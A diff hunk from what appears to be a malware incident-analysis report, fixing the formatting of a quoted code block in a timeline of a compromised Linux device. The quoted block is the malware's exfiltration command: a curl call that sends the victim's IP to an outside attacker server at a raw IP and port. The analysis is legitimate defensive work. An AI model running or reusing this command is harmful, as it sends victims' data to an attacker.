@@ -381,15 +381,14 @@ The Device carries on as usual with the malware, until a suspcious telnet login 
 From that time until 0343 AM, the user applied updates to the linux machine however the malware was still present as observed at 0344 AM when a CRON to update-logs pattern occured. The device then proceeds as usual with the malware until new behavior from the malware was observed at 0448 AM, this behavior is consistent with data exfiltration when observing the code:
 
 
-``` bash
--c 'curl --silent "http://196.251.73.38:47/save-data?IP=200.98.137.5" \
-			-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
-			-H 'Accept-Language: en-US,en;q=0.9' \
-			-H 'Cache-Control: max-age=0' \
-			-H 'Connection: keep-alive' \
-			-H 'Upgrade-Insecure-Requests: 1' \
-			--insecure'
-'''
+```bash -c 'curl --silent "http://196.251.73.38:47/save-data?IP=200.98.137.5" \
+    -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" \
+    -H "Accept-Language: en-US,en;q=0.9" \
+    -H "Cache-Control: max-age=0" \
+    -H "Connection: keep-alive" \
+    -H "Upgrade-Insecure-Requests: 1" \
+    --insecure'
+```
 
 
 ![image](https://github.com/user-attachments/assets/31143b39-2e80-4ca9-963c-3d242ffc0b0a)
